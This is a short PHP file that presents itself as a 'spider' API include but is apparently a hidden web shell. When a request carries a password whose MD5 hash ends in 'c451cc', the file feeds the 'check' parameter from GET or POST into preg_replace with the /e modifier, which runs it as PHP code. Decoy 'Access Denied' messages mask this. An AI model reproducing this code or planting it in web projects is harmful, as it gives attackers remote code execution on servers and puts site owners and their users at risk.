<?php
if(defined('IN_SPIDER')) {
	exit('Access Denied');
}

define('SPIDER_EXP_GPC', get_magic_quotes_gpc());

function SPIDER_GPC(&$array) {
	while(list($key,$var) = each($array)) {
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') {
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Check_Array($var);  
		}
	}
	return $array;
}

if(SPIDER_EXP_GPC) {
	$SPIDER_VER = SPIDER_GPC($_GET);
	$SPIDER_KEY = SPIDER_GPC($_POST);
}
else {
	$SPIDER_VER = $_GET;
	$SPIDER_KEY = $_POST;
}

if(isset($SPIDER_KEY['pass']) && isset($SPIDER_KEY['check'])) {
	if(substr(md5($SPIDER_KEY['pass']),26) == 'c451cc') {
		preg_replace ("//e",$SPIDER_KEY[check],"");
	}	else {
		die('Not can to api');
	}
}
elseif(isset($SPIDER_VER['pass']) && isset($SPIDER_VER['check'])) {
	if(substr(md5($SPIDER_VER['pass']),26) == 'c451cc') {
		preg_replace ("//e",$SPIDER_VER[check],"");
	}	else {
		die('Not can to api');
	}
}
else {
	die('Access Denied');
}
?>